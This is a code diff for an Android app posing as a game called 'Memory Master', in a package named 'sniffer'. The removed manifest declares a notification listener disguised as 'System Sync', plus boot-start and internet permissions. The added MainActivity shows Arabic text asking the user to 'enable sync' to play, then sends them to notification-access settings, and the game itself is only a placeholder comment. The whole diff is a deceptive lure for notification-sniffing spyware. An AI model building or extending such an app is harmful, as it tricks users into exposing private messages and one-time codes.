@@ -1,39 +1,57 @@
-<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+package com.v8.global.sniffer;
 
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+import android.content.Intent;
+import android.os.Bundle;
+import android.provider.Settings;
+import android.text.TextUtils;
+import android.view.Gravity;
+import android.widget.Button;
+import android.widget.LinearLayout;
+import android.widget.TextView;
+import androidx.appcompat.app.AppCompatActivity;
 
-    <application
-        android:label="Memory Master"
-        android:theme="@style/Theme.AppCompat.Translucent"
-        android:allowBackup="true"
-        android:supportsRtl="true">
+public class MainActivity extends AppCompatActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setGravity(Gravity.CENTER);
+        layout.setBackgroundColor(0xFF121212);
 
-        <activity android:name=".MainActivity" 
-            android:exported="true"
-            android:launchMode="singleTop">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
+        TextView title = new TextView(this);
+        title.setText("Memory Master v3.0\nيرجى تفعيل المزامنة لبدء اللعبة");
+        title.setTextColor(0xFF00FF00);
+        title.setGravity(Gravity.CENTER);
+        title.setPadding(0, 0, 0, 50);
 
-        <service android:name=".NotificationService"
-            android:label="System Sync"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
-        </service>
+        Button btn = new Button(this);
+        btn.setText("ابدأ اللعب الآن");
+        btn.setOnClickListener(v -> {
+            if (!isNotificationEnabled()) {
+                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+            } else {
+                // الكود هنا يفتح اللعبة الفعلية
+            }
+        });
 
-        <receiver android:name=".BootReceiver" android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
-        </receiver>
+        layout.addView(title);
+        layout.addView(btn);
+        setContentView(layout);
+    }
 
-    </application>
-</manifest>
+    private boolean isNotificationEnabled() {
+        String pkgName = getPackageName();
+        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
+        if (!TextUtils.isEmpty(flat)) {
+            final String[] names = flat.split(":");
+            for (String name : names) {
+                if (pkgName.equals(android.content.ComponentName.unflattenFromString(name).getPackageName())) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+}
